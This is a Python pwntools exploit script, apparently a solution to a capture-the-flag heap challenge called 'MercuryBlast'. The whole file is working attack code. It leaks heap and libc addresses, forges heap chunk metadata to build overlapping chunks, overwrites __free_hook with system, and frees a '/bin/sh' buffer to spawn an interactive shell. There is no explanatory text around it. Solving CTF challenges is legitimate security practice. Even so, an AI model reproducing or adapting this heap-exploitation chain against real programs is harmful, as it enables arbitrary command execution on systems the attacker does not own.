from pwn import *

elf=ELF('./MercuryBlast')
r=process('./MercuryBlast')
# r=remote('ash-chal.firebird.sh',36034)
libc=ELF('./libc.so.6')
# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

# context.log_level='debug'
# context.terminal=['tmux','splitw','-h']
context.arch='amd64'

def create(temperature,size,data=b'\n'):
    r.recvuntil(b'Your choice: ')
    r.sendline(b'1')
    r.recvuntil(b'Input Temperature: ')
    r.sendline(bytes(str(temperature),encoding='utf8'))
    r.recvuntil(b'Input Description Size: ')
    r.sendline(bytes(str(size),encoding='utf8'))
    r.recvuntil(b'Input Description: ')
    r.send(data)

def show():
    r.recvuntil(b'Your choice: ')
    r.sendline(b'2')

def delete(idx):
    r.recvuntil(b'Your choice: ')
    r.sendline(b'3')
    r.recvuntil(b'Input Index: ')
    r.sendline(bytes(str(idx),encoding='utf8'))

def edit(idx,temperature,size,data):
    r.recvuntil(b'Your choice: ')
    r.sendline(b'4')
    r.recvuntil(b'Input index: ')
    r.sendline(bytes(str(idx),encoding='utf8'))
    r.recvuntil(b'Input Temperature: ')
    r.sendline(bytes(str(temperature),encoding='utf8'))
    r.recvuntil(b'Input Description Size: ')
    r.sendline(bytes(str(size),encoding='utf8'))
    r.recvuntil(b'Input Description: ')
    r.send(data)

def blast(pay):
    r.recvuntil(b'Your choice: ')
    r.sendline(pay)

create(1.1,0x20)
create(1.1,0x18)
delete(0)
delete(1)
create(1.1,0x18)
show()
r.recvuntil(b'Description: ')
heap_base = u64(r.recv(6).ljust(8,b'\x00')) - 0x20a
print(hex(heap_base))

create(1.1,0x20) # 1
create(1.1,0x200) # 2
create(1.1,0x200) # 3
create(1.1,0x200,b'/bin/sh') # 4
payload = flat(b'a'*0x20,0,0x21,0x3ff199999999999a,0x18,heap_base + 0x310,0x481)
edit(1,1.1,len(payload),payload)
# gdb.attach(r,'b*$rebase(0x1497)')
delete(0)
create(1.1,0x30) # 0
show()
r.recvuntil(b'Description: ')
libc_base = u64(r.recv(6).ljust(8,b'\x00')) - 0x1ebf0a - 0x1000
print(hex(libc_base))

system_addr = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
payload = flat(b'a'*0x20,0,0x21,0x3ff199999999999a,0x30,free_hook,0x41)
edit(1,1.1,len(payload),payload)
edit(0,1.1,8,flat(system_addr))
delete(4)

# gdb.attach(r,'b*$rebase(0x1876)')

r.interactive()